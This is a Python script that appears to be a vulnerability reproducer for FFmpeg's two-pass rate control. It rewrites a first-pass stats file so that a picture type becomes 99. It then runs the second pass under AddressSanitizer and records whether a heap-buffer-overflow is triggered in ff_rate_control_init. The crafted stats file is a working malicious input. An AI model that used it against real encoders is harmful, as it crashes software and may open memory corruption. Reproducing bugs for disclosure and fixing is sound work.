"""Run and record the two-pass rate-control picture-type ASan reproducer."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import subprocess
import tempfile
from datetime import UTC, datetime
from pathlib import Path

SCHEMA_VERSION = "cw.ffmpeg.ratecontrol-stats-reproducer.v1"


def _arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--ffmpeg", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args()


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def main() -> None:
    args = _arguments()
    ffmpeg = args.ffmpeg.expanduser().resolve()
    output = args.output.expanduser().resolve()
    if not ffmpeg.is_file():
        raise ValueError("ffmpeg binary must exist")

    environment = os.environ.copy()
    environment["ASAN_OPTIONS"] = (
        "halt_on_error=1:abort_on_error=1:detect_leaks=0"
    )
    with tempfile.TemporaryDirectory(prefix="clearwing-ratecontrol-") as temp_dir:
        passlog_prefix = Path(temp_dir) / "passlog"
        common = [
            str(ffmpeg),
            "-hide_banner",
            "-loglevel",
            "error",
            "-f",
            "lavfi",
            "-i",
            "color=c=black:s=16x16:r=1:d=2",
            "-c:v",
            "mpeg2video",
        ]
        pass1_command = [
            *common,
            "-pass",
            "1",
            "-passlogfile",
            str(passlog_prefix),
            "-f",
            "null",
            "-",
        ]
        pass1_result = subprocess.run(
            pass1_command,
            env=environment,
            check=False,
            capture_output=True,
            text=True,
        )
        stats_path = Path(f"{passlog_prefix}-0.log")
        original_stats = stats_path.read_text() if stats_path.is_file() else ""
        malicious_stats = original_stats.replace("type:1", "type:99", 1)
        stats_mutated = malicious_stats != original_stats
        if stats_mutated:
            stats_path.write_text(malicious_stats)
        pass2_command = [
            *common,
            "-pass",
            "2",
            "-passlogfile",
            str(passlog_prefix),
            "-f",
            "null",
            "-",
        ]
        pass2_result = subprocess.run(
            pass2_command,
            env=environment,
            check=False,
            capture_output=True,
            text=True,
        )

    combined = pass2_result.stdout + pass2_result.stderr
    indicators = {
        "first_pass_succeeded": pass1_result.returncode == 0,
        "stats_picture_type_mutated": stats_mutated,
        "ubsan_type_99_index": "index 99 out of bounds" in combined,
        "asan_heap_buffer_overflow": (
            "AddressSanitizer: heap-buffer-overflow" in combined
        ),
        "eight_byte_read": "READ of size 8" in combined,
        "rate_control_init_in_trace": "ff_rate_control_init" in combined,
        "encoder_aborted": pass2_result.returncode != 0,
    }
    expected_observed = all(indicators.values())
    commit_result = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=ffmpeg.parent,
        check=False,
        capture_output=True,
        text=True,
    )
    payload = {
        "schema_version": SCHEMA_VERSION,
        "completed_at": datetime.now(UTC).isoformat(),
        "ffmpeg": str(ffmpeg),
        "ffmpeg_sha256": _sha256(ffmpeg),
        "checkout_commit": commit_result.stdout.strip() or None,
        "pass1_command": pass1_command,
        "pass1_returncode": pass1_result.returncode,
        "pass1_stdout": pass1_result.stdout,
        "pass1_stderr": pass1_result.stderr,
        "original_stats": original_stats,
        "malicious_stats": malicious_stats,
        "pass2_command": pass2_command,
        "asan_options": environment["ASAN_OPTIONS"],
        "returncode": pass2_result.returncode,
        "indicators": indicators,
        "expected_observed": expected_observed,
        "stdout": pass2_result.stdout,
        "stderr": pass2_result.stderr,
    }
    output.parent.mkdir(parents=True, exist_ok=True)
    temporary = output.with_suffix(output.suffix + ".tmp")
    temporary.write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n")
    temporary.replace(output)
    print(output)
    if not expected_observed:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
